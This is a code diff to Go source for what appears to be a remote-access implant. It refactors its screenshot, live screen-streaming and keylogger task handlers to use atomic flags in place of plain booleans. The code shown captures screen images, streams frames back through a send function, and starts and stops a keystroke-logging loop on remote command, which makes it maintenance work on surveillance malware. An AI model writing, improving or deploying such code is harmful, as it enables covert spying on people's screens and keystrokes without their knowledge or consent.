@@ -10,6 +10,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"sync/atomic"
 	"time"
 )
 
@@ -23,16 +24,16 @@ func handleScreenshot(task Task, res *TaskResult) {
 		res.Output = base64.StdEncoding.EncodeToString(data)
 		res.Encoding = "base64"
 		res.Size = int64(len(data))
-		inFastMode = true
+		inFastMode.Store(true)
 	}
 }
 
 func handleScreenStreamStart(task Task, res *TaskResult) {
 	intervalSec, quality := parseScreenStreamSettings(task.Command)
-	if !screenStreaming {
-		screenStreaming = true
+	if atomic.LoadInt32(&screenStreaming) == 0 {
+		atomic.StoreInt32(&screenStreaming, 1)
 		go func() {
-			for screenStreaming {
+			for atomic.LoadInt32(&screenStreaming) == 1 {
 				data, err := takeScreenshotJPEG(quality)
 				if err == nil {
 					sendScreenFrame(data)
@@ -76,7 +77,7 @@ func parseScreenStreamSettings(command string) (intervalSec int, quality int) {
 }
 
 func handleScreenStreamStop(task Task, res *TaskResult) {
-	screenStreaming = false
+	atomic.StoreInt32(&screenStreaming, 0)
 	res.Output = "screen stream stopped"
 }
 
@@ -94,15 +95,15 @@ func handleScreenshotWindow(task Task, res *TaskResult) {
 // ── Keylogger ───────────────────────────────────────────────────────────
 
 func handleKeyloggerStart(task Task, res *TaskResult) {
-	if !keylogActive {
-		keylogActive = true
+	if atomic.LoadInt32(&keylogActive) == 0 {
+		atomic.StoreInt32(&keylogActive, 1)
 		go keyloggerLoop()
 	}
 	res.Output = "keylogger started"
 }
 
 func handleKeyloggerStop(task Task, res *TaskResult) {
-	keylogActive = false
+	atomic.StoreInt32(&keylogActive, 0)
 	res.Output = "keylogger stopped"
 }
 
